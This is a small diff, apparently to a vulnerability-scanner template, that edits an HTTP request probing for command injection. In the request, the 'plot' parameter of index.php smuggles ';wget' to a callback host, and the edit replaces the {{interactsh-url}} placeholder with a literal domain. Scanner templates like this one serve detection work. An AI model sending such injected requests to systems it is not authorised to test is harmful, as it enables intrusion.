@@ -19,7 +19,7 @@ info:
 http:
   - raw:
       - |
-        GET /index.php?plot=;wget%20http://{{interactsh-url}} HTTP/1.1
+        GET /index.php?plot=;wget%20http://interactsh-url.com HTTP/1.1
         Host: {{Hostname}}
         Accept: */*
 
